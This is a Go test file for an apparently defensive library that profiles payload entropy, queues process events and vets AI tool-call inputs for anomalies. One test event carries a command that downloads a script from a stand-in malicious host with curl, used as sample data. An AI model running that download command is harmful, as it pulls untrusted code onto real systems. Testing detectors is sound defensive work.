package c2blue55

import (
	"math"
	"testing"
)

func TestHighLevelAPI_LifecycleAndEntropy(t *testing.T) {
	// 1. Calculateur d'entropie
	buf := []byte("The quick brown fox jumps over the lazy dog.")
	entQ8 := CalcEntropyQ8(buf)
	entBits := CalcEntropyBits(buf)
	if entQ8 == 0 || entBits <= 3.0 || entBits >= 6.0 {
		t.Errorf("Entropie inattendue pour prose : q8=%d, bits=%.4f", entQ8, entBits)
	}

	// 2. Profilage de charge utile
	prof := ProfilePayload(buf)
	if prof.PayloadClass != PayloadClassProse {
		t.Errorf("Classe de charge utile attendue Prose (1), obtenu %d", prof.PayloadClass)
	}

	// 3. Profilage Base64
	b64Buf := []byte("SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IG9mIGJhc2U2NCBlbmNvZGluZyBmb3IgYzJibHVlNTUuLi4=")
	profB64 := ProfilePayload(b64Buf)
	if profB64.PayloadClass != PayloadClassBase64 {
		t.Errorf("Classe attendue Base64 (3), obtenu %d", profB64.PayloadClass)
	}

	// 4. Canal annulaire et compteur de drops
	ch := NewChannel()
	var ev Event
	ev.Subsystem = SubProc
	ev.Action = ActExec
	copy(ev.Payload[:], "/usr/bin/curl -O https://malicious.test/payload.sh")

	if res := ch.Write(&ev); res != 0 {
		t.Errorf("ch.Write(&ev) = %d, attendu 0", res)
	}

	var readEv Event
	if res := ch.Read(&readEv); res != 1 || readEv.Subsystem != SubProc {
		t.Errorf("ch.Read(&readEv) = %d, attendu 1", res)
	}

	// 5. Contexte et relève équitable (PollBatch)
	ctx := NewContext(Config{})
	if err := ctx.Start(); err != nil {
		t.Fatal(err)
	}
	if ctx.InjectObservation(&ev) != 0 {
		t.Fatal("observation injection failed")
	}

	outBatch := make([]Event, 10)
	polled := ctx.PollBatch(outBatch, 10)
	if polled != 1 || outBatch[0].Payload != ev.Payload {
		t.Errorf("ctx.PollBatch injected observation = %d, want 1 with original payload", polled)
	}
	_ = ctx.Stop()
}

func TestHighLevelAPI_ZeroAllocation(t *testing.T) {
	buf := make([]byte, 256)
	for i := range buf {
		buf[i] = byte(i)
	}
	sample := []byte("/devhoros/pkg/c2blue55/c2blue55.go")
	RegisterToolGrammar("read_file", sample, 0x01, 115)

	allocs := testing.AllocsPerRun(1000, func() {
		_ = CalcEntropyQ8(buf)
		_ = ProfilePayload(buf)
		_, _, _ = EvalGrammar("read_file", sample)
	})
	if allocs != 0 {
		t.Errorf("AllocsPerRun = %.2f, attendu 0.0 (0 B/op)", allocs)
	}
}

func TestEvalGrammar_NominalAndVeto(t *testing.T) {
	sample := []byte("/devhoros/pkg/c2blue55/c2blue55.go")
	RegisterToolGrammar("read_file_g07", sample, 0x01, 115)

	djs, flags, veto := EvalGrammar("read_file_g07", []byte("/devhoros/pkg/c2blue55/abi_alignment_test.go"))
	if flags&FlagSuspiciousMCP != 0 || veto != nil {
		t.Fatalf("nominal veto: djs=%d flags=0x%x veto=%s", djs, flags, veto)
	}

	djs, flags, veto = EvalGrammar("read_file_g07", []byte{0x7F, 'E', 'L', 'F', 0x01, 0x01, 0x01, 0x00})
	if flags&(FlagAnomaly|FlagSuspiciousMCP) != (FlagAnomaly | FlagSuspiciousMCP) {
		t.Fatalf("ELF flags = 0x%x djs=%d", flags, djs)
	}
	if len(veto) == 0 || string(veto) != string(vetoGrammarJSON) {
		t.Fatalf("veto JSON = %s", veto)
	}
}

func TestHighLevelAPI_SliceBoundsClamp(t *testing.T) {
	small := []byte("tiny")
	ent := CalcEntropyQ8(small)
	if ent == 0 || math.IsNaN(float64(ent)) {
		t.Errorf("CalcEntropyQ8(small) invalide")
	}
}
